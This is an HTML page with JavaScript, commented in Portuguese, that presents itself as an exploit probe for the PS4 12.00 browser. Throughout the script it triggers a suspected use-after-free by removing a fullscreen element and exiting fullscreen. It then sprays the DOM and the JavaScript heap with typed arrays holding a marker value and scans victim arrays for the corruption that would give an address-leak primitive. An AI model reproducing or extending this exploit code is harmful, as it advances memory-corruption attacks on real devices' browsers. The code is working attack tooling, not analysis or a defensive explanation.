<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 12.00 - UAF Aggressive Reclaim + Exploit Probe</title>
</head>
<body style="background:#111;color:#0f0;font-family:monospace;">

<h2>PS4 12.00 - UAF Aggressive Reclaim (Exploit Stage)</h2>
<button onclick="runTest()">Run Test</button>

<div id="log" style="margin-top:20px;"></div>

<script>
function log(msg) {
    try { console.log(msg); } catch(e){}
    document.getElementById("log").innerHTML += "<p>" + msg + "</p>";
}

const PATTERN = 2.121995791e-314;

// ==========================
// HEAP SETUP (INALTERADO)
// ==========================
function setupHeap() {
    let controllers = [];

    for(let i = 0; i < 5000; i++) {
        let arr = new Float64Array(8);
        arr[0] = i;
        controllers.push(arr);
    }

    return controllers;
}

// ==========================
// 🧠 NOVO: VÍTIMAS JS HEAP
// ==========================
let victims = [];

function setupVictims() {
    log("[*] Criando vítimas TypedArray");

    victims = [];

    for (let i = 0; i < 2000; i++) {
        let v = new Float64Array(16);
        v[0] = 13.37;
        v[1] = 14.47;
        victims.push(v);
    }
}

// ==========================
// FULLSCREEN (INALTERADO)
// ==========================
function setupFullscreen() {
    let fsTarget = document.createElement("div");

    fsTarget.innerHTML = "<h1 style='margin-top:20%;text-align:center;'>FULLSCREEN ACTIVE<br>Press OPTIONS</h1>";

    fsTarget.style.background = "black";
    fsTarget.style.width = "100%";
    fsTarget.style.height = "100%";
    fsTarget.style.position = "absolute";
    fsTarget.style.top = "0";
    fsTarget.style.left = "0";

    document.body.appendChild(fsTarget);

    if (fsTarget.webkitRequestFullscreen) {
        fsTarget.webkitRequestFullscreen();
    } else {
        document.documentElement.webkitRequestFullscreen?.();
    }

    return fsTarget;
}

// ==========================
// 💣 AGGRESSIVE RECLAIM (INALTERADO + JS HEAP)
// ==========================
function aggressiveReclaim() {
    log("[*] Aggressive reclaim iniciado");

    let bucket = [];

    // Fase 1
    for (let i = 0; i < 8000; i++) {
        let el = document.createElement("div");
        document.body.appendChild(el);
        el.remove();
    }

    // Fase 2
    for (let i = 0; i < 10000; i++) {
        let el = document.createElement("div");
        el.innerHTML = "REUSE_EL_" + i;
        document.body.appendChild(el);
        bucket.push(el);
    }

    // Fase 3
    for (let i = 0; i < 10000; i++) {
        let txt = document.createTextNode("TXT_" + i);
        document.body.appendChild(txt);
        bucket.push(txt);
    }

    // Fase 4
    for (let i = 0; i < 10000; i++) {
        let el = document.createElement("div");
        el.setAttribute("data-x", "ATTR_" + i);
        document.body.appendChild(el);
        bucket.push(el);
    }

    // 🔥 NOVO: JS HEAP SPRAY (CRÍTICO)
    for (let i = 0; i < 8000; i++) {
        let buf = new Float64Array(32);
        buf.fill(PATTERN);
        bucket.push(buf);
    }

    // Fase 5
    for (let i = 0; i < 5000; i++) {
        let el = document.createElement("span");
        document.body.appendChild(el);
        el.remove();
    }

    log("[*] Aggressive reclaim finalizado: " + bucket.length);
    return bucket;
}

// ==========================
// 🔬 DETECÇÃO AVANÇADA
// ==========================
function checkTypedArrayCorruption() {
    log("---- CHECK TypedArray ----");

    let corrupted = 0;

    for (let i = 0; i < victims.length; i++) {
        let v = victims[i];

        try {
            if (
                v[0] !== 13.37 ||
                v[1] !== 14.47 ||
                v.byteLength !== 128
            ) {
                corrupted++;

                log("[CORRUPÇÃO] idx=" + i +
                    " v0=" + v[0] +
                    " v1=" + v[1] +
                    " byteLength=" + v.byteLength);

                // 🔥 POSSÍVEL ADDROF
                if (v[0] === PATTERN || v[1] === PATTERN) {
                    log("[!!!] SPRAY PATTERN DETECTADO → PRIMITIVA!");
                }

                if (corrupted > 10) break;
            }

        } catch(e) {
            log("[UAF] Exceção ao acessar vítima: " + e);
        }
    }

    if (corrupted === 0) {
        log("[OK] Nenhuma corrupção detectada");
    }
}

// ==========================
// DETECÇÃO DOM (INALTERADO)
// ==========================
function checkUAF(fsTarget) {
    log("---- CHECK DOM UAF ----");

    try {
        log("[CHECK] innerHTML = " + fsTarget.innerHTML);
    } catch(e) {
        log("[UAF] innerHTML erro: " + e);
    }

    try {
        log("[CHECK] outerHTML = " + fsTarget.outerHTML);
    } catch(e) {}

    try {
        log("[CHECK] childNodes = " + fsTarget.childNodes.length);
    } catch(e) {}

    try {
        log("[CHECK] data-x = " + fsTarget.getAttribute("data-x"));
    } catch(e) {}
}

// ==========================
// TRIGGER (INALTERADO)
// ==========================
function trigger(fsTarget) {
    log("[*] Trigger: remove + exitFullscreen");

    try {
        fsTarget.remove();

        if (document.webkitIsFullScreen || document.fullscreenElement) {
            document.webkitExitFullscreen?.() || document.webkitCancelFullScreen?.();
        }

    } catch(e) {
        log("[ERRO] " + e);
    }

    setTimeout(() => aggressiveReclaim(), 0);
    setTimeout(() => aggressiveReclaim(), 50);
    setTimeout(() => aggressiveReclaim(), 100);

    setTimeout(() => {
        checkUAF(fsTarget);
        checkTypedArrayCorruption();
    }, 300);

    setTimeout(() => location.reload(), 500);
}

// ==========================
// MAIN (INALTERADO + vítimas)
// ==========================
function runTest() {
    const logDiv = document.getElementById("log");
    logDiv.innerHTML = "<p>Running... Press OPTIONS</p>";

    log("[*] Iniciando teste");

    let controllers = setupHeap();

    setupVictims(); // 🔥 novo

    let fsTarget = setupFullscreen();

    window.onblur = function() {
        log("[*] onblur disparado");

        setTimeout(() => trigger(fsTarget), 3000);
    };
}
</script>
